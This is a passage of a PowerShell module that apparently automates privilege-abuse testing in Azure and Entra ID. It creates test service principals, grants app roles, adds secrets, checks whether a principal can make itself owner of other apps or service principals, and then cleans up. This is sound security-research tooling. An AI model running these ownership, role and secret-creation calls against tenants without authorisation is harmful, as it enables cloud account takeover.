                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMPublishAutomationAccountRunBook {
                $ThreadSafeTest = (& ${global:Test-AzureRMPublishAutomationAccountRunBook} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestSPDisplayName              $ThreadSafeSP.SPDisplayName `
                    -AutomationAccountPath          "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMCreateFunction {
                $ThreadSafeTest = (& ${global:Test-AzureRMCreateFunction} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestSPDisplayName              $ThreadSafeSP.SPDisplayName `
                    -PathToFunctionApp              "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMAddSelfToAzureRMRole {
                $ThreadSafeTest = (& ${global:Test-AzureRMAddSelfToAzureRMRole} `
                    -TestPrincipalID                $ThreadSafeSP.SPObjectId `
                    -AzureRMRoleDefinitionId        "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -UserAccessAdminAzureRMToken    $ThreadSafeUserAccessAdminToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -SubscriptionID                 $using:SubscriptionID
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }
            
            # Run all tests by default if the user did not specify an AbuseTestType
            default {
                $ThreadSafeTest = (& ${global:Test-AzureRMVMRunCommand} `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -HeldPrivilege          $AzureRMRoleDisplayName `
                    -TimeOfTest             $(Get-Date) `
                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMPublishAutomationAccountRunBook} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestPrincipalDisplayName       $ThreadSafeSP.SPDisplayName `
                    -AutomationAccountPath          "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMCreateFunction} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestPrincipalDisplayName       $ThreadSafeSP.SPDisplayName `
                    -PathToFunctionApp              "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMAddSelfToAzureRMRole} `
                    -TestPrincipalID                $ThreadSafeSP.SPObjectId `
                    -AzureRMRoleDefinitionId        "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -UserAccessAdminAzureRMToken    $ThreadSafeUserAccessAdminToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -SubscriptionID                 $using:SubscriptionID
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

            }
        }

    }
    $AzureRMTestResults
}

Function Remove-AbuseTestAzureRMRoles {
    <#
    .SYNOPSIS
        Remove all AzureRM role assignments associated with a particular abuse test GUID

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Removes all AzureRM role assignment associated with a particular abuse test GUID.

    .PARAMETER TestGUID
        The unique identifier of the abuse tests associated with the target AzureRM roles

    .PARAMETER SubscriptionID
        The ID of the AzureRM Subscription to remove abuse test role assignments from

    .PARAMETER UserAccessAdminAzureRMToken
        The AzureRM scoped JWT for a User Access Admin principal. This can be a global admin you've granted control of the subscription to (https://adsecurity.org/?p=4277)

    .EXAMPLE
        C:\PS> Remove-AbuseTestAzureRMRoles `
            -TestGUID "bf510275"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008" `
            -UserAccessAdminAzureRMToken $ARMToken `
            -MSGraphGlobalAdminToken $MGToken

        Description
        -----------
        Remove all abuse test role assignments associated with the test GUID "bf510275" from the subscription with ID of "f1816681-4df5-4a31-acfa-922401687008"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/rest/api/authorization/role-definitions/delete
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminAzureRMToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MSGraphGlobalAdminToken
        
    )

    # Remove the sub-level role assignments we granted the test SPs
    # Get list of the test service principals by their ID
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=startswith(displayName,'$($TestGUID)')"
    $Results = $null
    $TestSPObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($MSGraphGlobalAdminToken)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $TestSPObjects += $Results.value
        } else {
            $TestSPObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    # Get the current sub-level role assignments
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleAssignments?api-version=2018-01-01-preview"
    $Request = $null
    $SubLevelRoleAssignments = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($UserAccessAdminAzureRMToken)"} `
        -URI $URI `
        -Method GET 
    $RoleAssignmentToDelete = $null

    $TestSPObjects | ForEach-Object -ThrottleLimit 50 -Parallel {
        $TestSP = $_
        $RoleToDelete = ${using:SubLevelRoleAssignments}.value | ?{$_.properties.principalId -Match $TestSP.id}
        $URI = "https://management.azure.com/subscriptions/$(${using:SubscriptionID})/providers/microsoft.authorization/roleassignments/$($RoleToDelete.name)?api-version=2018-01-01-preview"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $(${using:UserAccessAdminAzureRMToken})"} `
            -URI $URI `
            -Method DELETE 
    }
}

Function Remove-AbuseTestServicePrincipals {
    <#
    .SYNOPSIS
        Remove all AzureAD Service Principals associated with a particular abuse test GUID

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Takes an abuse test GUID, finds all service principals where their display name starts with that GUID, and deletes them

    .PARAMETER TestGUID
        The unique identifier of the abuse tests 

    .PARAMETER MSGraphGlobalAdminToken
        The JWT for an AzureAD Global Admin

    .EXAMPLE
        C:\PS> Remove-AbuseTestAzureRMRoles `
            -TestGUID "bf510275"
            -MSGraphGlobalAdminToken $MGToken

        Description
        -----------
        Remove all service principals associated with the test GUID of "bf510275"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/graph/api/serviceprincipal-delete?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MSGraphGlobalAdminToken
        
    )

    # Delete the app registrations from the previous test
    $URI = "https://graph.microsoft.com/v1.0/applications?`$filter=startswith(displayName,'$($TestGUID)')"
    $Results = $null
    $TestAppRegObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($MSGraphGlobalAdminToken)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $TestAppRegObjects += $Results.value
        } else {
            $TestAppRegObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    $TestAppRegObjects | ForEach-Object -ThrottleLimit 200 -Parallel {
        $GAToken = ${using:MSGraphGlobalAdminToken}
        $App = $_
        Try {
            $DeleteApp = Invoke-RestMethod `
                -Headers @{Authorization = "Bearer $(${using:MSGraphGlobalAdminToken})"} `
                -Uri "https://graph.microsoft.com/v1.0/applications/$($App.id)" `
                -Method DELETE
        }
        Catch{
        }
    }
}

Function Get-MGAppRoles {
    <#
    .SYNOPSIS
        Gets the current list of available MS Graph app roles

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Finds the MS Graph Service Principal, then lists the available App Roles that can be scoped to Microsoft Graph

    .PARAMETER Token
        An MS-Graph scoped JWT for an AAD user

    .EXAMPLE
        Get-MGAppRoles -Token $Token.access_token

        Description
        -----------
        List all available Microsoft Graph App Roles

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Find the MS Graph service principal by its universal app ID, which is "00000003-0000-0000-c000-000000000000"
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"
    $MSGraphSP = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)"} `
        -URI $URI `
        -Method GET

    ForEach ($Role in $MSGraphSP.value.appRoles) {
        # Return an object of the app role
        $AppRole = New-Object PSObject -Property @{
            AppRoleScope        = $AppRegCreation.id
            AppRoleValue        = $Role.value
            AppRoleDisplayName  = $Role.displayName
            AppRoleID           = $Role.id
        }
        $AppRole
    }
}

Function New-TestAppReg {
    <#
    .SYNOPSIS
        Create a test Azure app registration for the purpose of an abuse automation test

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new AzureAD Application Registration object with a provided test GUID as part of the app's display name

    .PARAMETER TestGUID
        The unique identifier for your test, useful for later debugging purposes to differentiate tests from each other

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .EXAMPLE
        New-TestAppReg -DisplayName "MyCoolApp" -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Application Registration with a display name of "MyCoolApp"

    .EXAMPLE
        C:\PS> $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]
        C:\PS> $TestGUID
        2df84813
        C:\PS> $MGRole = "RoleManagement.ReadWrite.Directory"
        C:\PS> $DisplayName = $TestGUID + "-" + $MGRole
        C:\PS> New-TestAppReg `
            -DisplayName $DisplayName `
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Application Registration with a display name of "2df84813-RoleManagement.ReadWrite.Directory"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $DisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Because we are calling this function with several simultaneous threads, we sometimes need to retry the app reg creation step several times.
    $Count = 0
    $AppCreated = $False
    Do {
        Try {
            # Create the app reg
            $body = @{
                displayName = $DisplayName
            }
            $AppRegCreation = Invoke-RestMethod `
                -Headers        @{Authorization = "Bearer $($GlobalAdminMGToken)" } `
                -URI            "https://graph.microsoft.com/v1.0/applications" `
                -Method         POST `
                -Body           $($body | ConvertTo-Json) `
                -ContentType    'application/json'
            $AppCreated = $True
        }
        Catch {
        }
        $Count++
        Start-Sleep -s 5
    }
    Until ($AppCreated -or $Count -eq 100)

    # Wait 30 seconds for the app reg to propagate
    Start-Sleep -s 30

    $AppReg = @{
        AppRegObjectID      =   $AppRegCreation.id
        AppRegAppId         =   $AppRegCreation.appId
        AppRegDisplayName   =   $AppRegCreation.displayName
    }
    $AppReg
}
New-Variable -Name 'New-TestAppRegDefinition' -Value (Get-Command -Name "New-TestAppReg") -Force
New-Variable -Name 'New-TestAppRegAst' -Value (${New-TestAppRegDefinition}.ScriptBlock.Ast.Body) -Force

Function New-TestSP {
    <#
    .SYNOPSIS
        Create a test service principal for the purpose of an abuse automation test

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new AzureAD Service Principal with a provided test GUID as part of the SP's display name

    .PARAMETER TestGUID
        The unique identifier for your test, useful for later debugging purposes to differentiate tests from each other

    .PARAMETER AppId
        The AppId of the existing Application Registration object to associate this Service Principal with

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .EXAMPLE
        C:\PS> $AppID = "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"
        C:\PS> New-TestSP `
            -AppID $TestGUID
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Service Principal associated with the App Reg with AppId of "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"

    .EXAMPLE
        C:\PS> New-TestAppReg -DisplayName "MyCoolApp" -GlobalAdminMGToken $GlobalAdminToken.access_token | New-TestSP -GlobalAdminMGToken $GlobalAdminToken.access_token

        Description
        -----------
        Pipe the result of New-TestAppReg into New-TestSP, creating a new App Reg and its associated SP in one line

    .EXAMPLE
        $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]
        $MGRole = "RoleManagement.ReadWrite.Directory"
        $DisplayName = $TestGUID + "-" + $MGRole
        New-TestAppReg -DisplayName $DisplayName -GlobalAdminMGToken $GlobalAdminToken.access_token New-TestSP -GlobalAdminMGToken $GlobalAdminToken.access_token

        Description
        -----------
        Create a new app reg with a test GUID and MG Role name, then pipe that output to New-TestSP to create the associated SP as well in one line

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [Alias('AppRegAppId')]
        [String]
        $AppId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Create the SP
    $body = @{
        appId = $AppId
    }
    $SPCreation = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($GlobalAdminMGToken)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $SP = @{
        SPObjectID     = $SPCreation.id
        SPAppId        = $SPCreation.appId
        SPDisplayName  = $SPCreation.displayName
    }

    $SP
}
New-Variable -Name 'New-TestSPDefinition' -Value (Get-Command -Name "New-TestSP") -Force
New-Variable -Name 'New-TestSPAst' -Value (${New-TestSPDefinition}.ScriptBlock.Ast.Body) -Force

Function New-AppRegSecret {
    <#
    .SYNOPSIS
        Add a new secret to an existing app registration object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new secret for an AzureAD App Registration which can then be used to authenticate to Azure services as the associated Service Principal

    .PARAMETER AppRegObjectId
        The object ID of the existing Application Registration object

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add a secret to the target app registration

    .EXAMPLE
        C:\PS> $AppRegObjectId = "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"
        C:\PS> New-AppRegSecret `
            -AppRegObjectId $AppRegObjectId
            -Token $Token

        Description
        -----------
        Create a new secret for the Application Registration with object ID of "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"

    .EXAMPLE
        C:\PS> New-TestAppReg -DisplayName "MyCoolApp" -Token $GlobalAdminToken.access_token | New-AppRegSecret -Token $GlobalAdminToken.access_token

        Description
        -----------
        Pipe the result of New-TestAppReg into New-AppRegSecret, creating a new App Reg and a secret for it in one line

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppRegObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Get the Application Registration's App ID
    $AppReg = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/applications/$($AppRegObjectID)" `
        -Method         GET `
        -ContentType    'application/json'

    # Add a credential to the app reg
    $body = @{
        displayName = "My cool password"
    }
    $AppRegSecret = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/applications/$($AppRegObjectID)/addPassword" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $AppRegSecret = @{
        AppRegObjectId     =    $AppRegObjectId
        AppRegAppId        =    $AppReg.appId
        AppRegSecretValue  =    $AppRegSecret.secretText
    }

    $AppRegSecret
}
New-Variable -Name 'New-AppRegSecretDefinition' -Value (Get-Command -Name "New-AppRegSecret") -Force
New-Variable -Name 'New-AppRegSecretAst' -Value (${New-AppRegSecretDefinition}.ScriptBlock.Ast.Body) -Force

Function New-ServicePrincipalSecret {
    <#
    .SYNOPSIS
        Add a new secret to an existing service principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new secret for an AzureAD Service Principal which can then be used to authenticate to Azure services as the Service Principal

    .PARAMETER ServicePrincipalID
        The object ID of the existing Service Principal

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add a new secret to the target service principal

    .EXAMPLE
        C:\PS> $ServicePrincipalID = "71c9f3d1-a6ef-4c3a-b5d7-bb668a16a61c"
        C:\PS> New-ServicePrincipalSecret `
            -ServicePrincipalID $ServicePrincipalID
            -Token $Token

        Description
        -----------
        Create a new secret for the Service Principal with object ID of "71c9f3d1-a6ef-4c3a-b5d7-bb668a16a61c"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ServicePrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Get the Service Principal's App ID
    $ServicePrincipal = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalID)" `
        -Method         GET `
        -ContentType    'application/json'

    # Add a credential to the service principal
    $body = @{
        displayName = "My cool password"
    }
    $ServicePrincipalSecret = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalID)/addPassword" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $ServicePrincipalSecret = @{
        ServicePrincipalObjectId     = $ServicePrincipalID
        ServicePrincipalAppId        = $ServicePrincipal.appId
        ServicePrincipalSecretValue  = $ServicePrincipalSecret.secretText
    }

    $ServicePrincipalSecret
}
New-Variable -Name 'New-ServicePrincipalSecretDefinition' -Value (Get-Command -Name "New-ServicePrincipalSecret") -Force
New-Variable -Name 'New-ServicePrincipalSecretAst' -Value (${New-ServicePrincipalSecretDefinition}.ScriptBlock.Ast.Body) -Force

Function New-AppRoleAssignment {
    <#
    .SYNOPSIS
        Grant an App Role assignment to a Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grants an App Role assignment to an existing AzureAD Service Principal

    .PARAMETER SPObjectId
        The object ID of the existing AAD Service Principal to which you are granting the App Role

    .PARAMETER AppRoleID
        The ID of the App Role you are granting to the AAD Service Principal

    .PARAMETER ResourceID
        The object ID of the AzureAD resource app (service principal) the App Role is scoped against

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .EXAMPLE
        C:\PS> New-AppRoleAssignment -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" -GlobalAdminMGToken $GlobalAdminToken.access_token

        Description
        -----------
        Grant the App Role with ID of "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" to the Service Principal with ObjectID of "6b6f9289-fe92-4930-a331-9575e0a4c1d8"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SPObjectId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppRoleID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ResourceID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Grant the app role to the service principal
    $body = @{
        principalId = $SPObjectId
        resourceId  = $ResourceID
        appRoleId   = $AppRoleID
        startTime   = "2020-01-01T12:00:00Z" # This field is required or the API call will fail. The value does not matter.
        expiryTime  = "2023-01-01T10:00:00Z" # This field is required or the API call will fail. The value does not matter.
    }
    $GrantAppRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($GlobalAdminMGToken)" } `
        -Uri            "https://graph.microsoft.com/v1.0/servicePrincipals/$($SPObjectId)/appRoleAssignedTo" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $AppRoleAssignment = @{
        AppRoleAssignmentID                     = $GrantAppRole.id
        AppRoleAssignmentAppRoleID              = $GrantAppRole.appRoleId
        AppRoleAssignmentPrincipalDisplayName   = $GrantAppRole.principalDisplayName
        AppRoleAssignmentPrincipalID            = $GrantAppRole.principalId
        AppRoleAssignmentResourceName           = $GrantAppRole.resourceDisplayName
        AppRoleAssignmentResourceObjectID       = $GrantAppRole.resourceId
    }
    $AppRoleAssignment
}
New-Variable -Name 'New-AppRoleAssignmentDefinition' -Value (Get-Command -Name "New-AppRoleAssignment") -Force
New-Variable -Name 'New-AppRoleAssignmentAst' -Value (${New-AppRoleAssignmentDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfAsOwnerOfApp {
    <#
    .SYNOPSIS
        Tests whether a Service Principal add itself as the owner of an app registration object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated service principal ownership of an app registration

    .PARAMETER TestPrincipalID
        The ID of the service principal you are performing the test as.
        This is the SP that will try to add itself as the owner of another SP.

    .PARAMETER TargetAppId
        The object ID of the AzureAD App you are trying to add an owner to.

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER HeldPrivilege
        The MS Graph app role your test SP has been granted

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER TestGUID
        The unique ID for your test. This should be used across all SPs and objects for this test.

    .EXAMPLE
        C:\PS> Test-MGAddSelfAsOwnerOfApp `
            -TestPrincipalId "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetAppId "cd8baf4b-ede9-47cb-800b-6997ae93a1f0" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken
            -TimeOfTest Get-Date

        Description
        -----------
        Test whether the supplied JWT can add itself as an owner of the App Reg with object ID of "cd8baf4b-ede9-47cb-800b-6997ae93a1f0"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetAppId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as an owner over an app reg
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $AddAppOwner = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/owners/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to app"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP as owner of the target app
        # Wait 1 minute for the app ownership to have propagated in Azure before deleting the app ownership
        Start-Sleep -s 60
        $body = @{
            "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($SPCreation.id)"
        }
        Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/owners/`$ref" `
            -Method DELETE `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfAsOwnerOfAppDefinition' -Value (Get-Command -Name "Test-MGAddSelfAsOwnerOfApp") -Force
New-Variable -Name 'Test-MGAddSelfAsOwnerOfAppAst' -Value (${Test-MGAddSelfAsOwnerOfAppDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfAsOwnerOfSP {
    <#
    .SYNOPSIS
        Tests whether a Service Principal add itself as the owner of another Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated service principal ownership of another service principal

    .PARAMETER TestPrincipalID
        The ID of the service principal you are performing the test as.
        This is the SP that will try to add itself as the owner of another SP.

    .PARAMETER TargetSPId
        The object ID of the AzureAD SP you are trying to add an owner to.

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER HeldPrivilege
        The MS Graph app role your test SP has been granted

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER TestGUID
        The unique ID for your test. This should be used across all SPs and objects for this test.

    .EXAMPLE
        C:\PS> Test-MGAddSelfAsOwnerOfSP `
            -TestPrincipalId "028362ca-90ae-41f2-ae9f-1a678cc17391" `
